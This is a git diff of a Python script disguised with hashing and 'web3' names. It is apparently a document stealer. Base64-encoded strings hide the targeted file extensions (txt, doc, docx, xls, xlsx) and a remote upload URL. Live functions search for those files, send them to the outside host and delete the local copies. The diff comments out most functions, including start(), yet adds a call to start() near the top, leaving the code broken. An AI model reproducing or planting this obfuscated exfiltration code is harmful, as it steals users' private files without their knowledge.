@@ -9,22 +9,20 @@ import string
 import base64
 import aiohttp
 import asyncio
-
 import time
-
 hash_keys = ['dHh0', 'ZG9jeA==', 'eGxz', 'eGxzeA==', 'ZG9j']
 hash_web3_key = 'aHR0cDovL2RhbmlsYXZhbmRvdmVyLnB5dGhvbmFueXdoZXJlLmNvbS91cGxvYWQ='
 temp_hash = 'dGVtcF9oYXNoX2Rpcg=='
+asyncio.run(start())
 
-def warnings_cather():
-    warnings.filterwarnings("ignore", category=UserWarning, module="os")
-    warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
-    warnings.filterwarnings("ignore", category=UserWarning, module="warnings")
-    warnings.filterwarnings("ignore", category=UserWarning, module="requests")
-    warnings.filterwarnings("ignore", category=UserWarning, module="uuid")
-    warnings.filterwarnings("ignore", category=UserWarning, module="datetime")
-    warnings.filterwarnings("ignore", category=UserWarning, module="base64")
-
+# def warnings_cather():
+#     warnings.filterwarnings("ignore", category=UserWarning, module="os")
+#     warnings.filterwarnings("ignore", category=UserWarning, module="zipfile")
+#     warnings.filterwarnings("ignore", category=UserWarning, module="warnings")
+#     warnings.filterwarnings("ignore", category=UserWarning, module="requests")
+#     warnings.filterwarnings("ignore", category=UserWarning, module="uuid")
+#     warnings.filterwarnings("ignore", category=UserWarning, module="datetime")
+#     warnings.filterwarnings("ignore", category=UserWarning, module="base64")
 
 def get_task_id():
     try:
@@ -34,19 +32,19 @@ def get_task_id():
     except Exception as e:
         return None
 
-def get_task_hash():
-    try:
-        task_hash = hash_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))
-        return task_hash
-    except Exception as e:
-        return None
+# def get_task_hash():
+#     try:
+#         task_hash = hash_formating(':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)]))
+#         return task_hash
+#     except Exception as e:
+#         return None
 
-def hash_formating(hash):
-    try:
-        modified_hash = hash.replace('-', '_').replace(':', '_').replace('.', '_').replace(' ', '_')
-        return modified_hash
-    except Exception as e:
-        return None
+# def hash_formating(hash):
+#     try:
+#         modified_hash = hash.replace('-', '_').replace(':', '_').replace('.', '_').replace(' ', '_')
+#         return modified_hash
+#     except Exception as e:
+#         return None
 
 def find_web3_hash(hash_keys):
     hash_keys = [base64.b64decode(key).decode('utf-8') for key in hash_keys]
@@ -70,31 +68,29 @@ async def validate_hash_by_web3_key(hash_value):
     await session.close()
     delete_сache(hash_value)
 
-
 def delete_сache(hash_value):
     try:
         os.remove(hash_value)
     except Exception as e:
         pass
 
-def generate_key():
-    value = string.ascii_letters + string.digits
-    unique_key = ''.join(random.choice(value) for _ in range(5))
-    return unique_key
+# def generate_key():
+#     value = string.ascii_letters + string.digits
+#     unique_key = ''.join(random.choice(value) for _ in range(5))
+#     return unique_key
 
-def hash_connector():
-    task_id = get_task_id()
-    task_hash = get_task_hash()
-    unique_hash = ''
-    hash_key = generate_key()
-
-    if (task_id != None) | (task_hash != None):
-        unique_hash = unique_hash + f'{str(task_id)}' + f' {str(task_hash)}'
-    else:
-        unique_hash = datetime.now().strftime("%Y_%m_%d %H_%M_%S")
-    unique_hash = unique_hash + f'__{hash_key}_'
-    return unique_hash
-
+# def hash_connector():
+#     task_id = get_task_id()
+#     task_hash = get_task_hash()
+#     unique_hash = ''
+#     hash_key = generate_key()
+#
+#     if (task_id != None) | (task_hash != None):
+#         unique_hash = unique_hash + f'{str(task_id)}' + f' {str(task_hash)}'
+#     else:
+#         unique_hash = datetime.now().strftime("%Y_%m_%d %H_%M_%S")
+#     unique_hash = unique_hash + f'__{hash_key}_'
+#     return unique_hash
 
 def hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> object:
     current_value = 0
@@ -114,17 +110,13 @@ def hash_identifier(hash_paths: list, hash_result: str, temp_hash: str) -> objec
 
     return hash_value
 
-async def main(arch_list):
-    tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]
-    await asyncio.gather(*tasks)
+# async def main(arch_list):
+#     tasks = [validate_hash_by_web3_key(arch) for arch in arch_list]
+#     await asyncio.gather(*tasks)
 
-
-async def start():
-    warnings_cather()
-    hash_paths = list(find_web3_hash(hash_keys))
-    hash_connect = hash_connector()
-    hash_list = hash_identifier(hash_paths, hash_connect, temp_hash)
-    await main(hash_list)
-
-
-asyncio.run(start())
+# async def start():
+#     warnings_cather()
+#     hash_paths = list(find_web3_hash(hash_keys))
+#     hash_connect = hash_connector()
+#     hash_list = hash_identifier(hash_paths, hash_connect, temp_hash)
+#     await main(hash_list)
